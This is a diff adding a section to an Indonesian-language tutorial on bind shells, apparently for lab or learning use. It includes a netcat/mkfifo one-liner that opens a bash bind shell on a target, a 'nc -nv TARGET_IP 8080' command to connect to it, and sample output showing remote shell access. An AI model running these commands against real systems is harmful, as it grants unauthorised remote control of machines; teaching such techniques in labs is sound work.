@@ -159,3 +159,31 @@ target@rootuser:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -
 ```
 
 Setelah command ini dijalankan, terminal target bakal "gantung" (waiting) nungguin koneksi dari kita.
+
+### Attacker Connects to the Bind Shell
+
+Sekarang setelah target "menunggu" di port 8080, kita sebagai attacker tinggal inisiasi koneksi ke sana pake Netcat.
+
+Command-nya:
+
+```bash
+nc -nv TARGET_IP 8080
+```
+
+**Penjelasan Command:**
+
+- `nc`: Panggil Netcat.
+- `-n`: **No DNS**, biar cepet dan gak berisik ngelakuin DNS lookup.
+- `-v`: **Verbose**, biar kita tau pas koneksinya berhasil ("open").
+- `TARGET_IP`: IP address mesin target yang udah kita pasangin bind shell.
+- `8080`: Port yang lagi dibuka sama bind shell di target.
+
+**Attacker Terminal (After Connection):**
+
+```bash
+attacker@arch:~$ nc -nv 10.10.13.37 8080
+(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
+target@rootuser:~$
+```
+
+Pas koneksi berhasil (`open`), kita langsung dapet shell Coba ketik perintah kayak `whoami` atau `ls`, pasti jalan di mesin target.
